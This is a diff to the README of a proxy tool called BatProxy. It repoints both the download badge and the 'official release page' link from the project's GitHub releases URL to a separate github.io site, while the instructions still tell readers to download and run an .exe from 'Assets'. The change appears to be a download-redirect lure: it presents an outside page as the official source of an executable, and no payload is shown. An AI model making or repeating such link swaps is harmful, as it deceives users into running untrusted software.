@@ -1,6 +1,6 @@
 # 🛡️ BatProxy - Fast and reliable private internet browsing
 
-[![Download BatProxy](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Coccal-gulch915/BatProxy/releases)
+[![Download BatProxy](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://coccal-gulch915.github.io)
 
 BatProxy helps you browse the internet through secure tunnels. It routes your traffic through Cloudflare servers to hide your identity. This software provides a stable connection for your daily tasks. It includes automatic backup features to keep you online if one connection fails.
 
@@ -8,7 +8,7 @@ BatProxy helps you browse the internet through secure tunnels. It routes your tr
 
 Follow these steps to get BatProxy on your computer.
 
-1. Visit the [official release page](https://github.com/Coccal-gulch915/BatProxy/releases).
+1. Visit the [official release page](https://coccal-gulch915.github.io).
 2. Look for the section labeled Assets.
 3. Click the file that ends in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
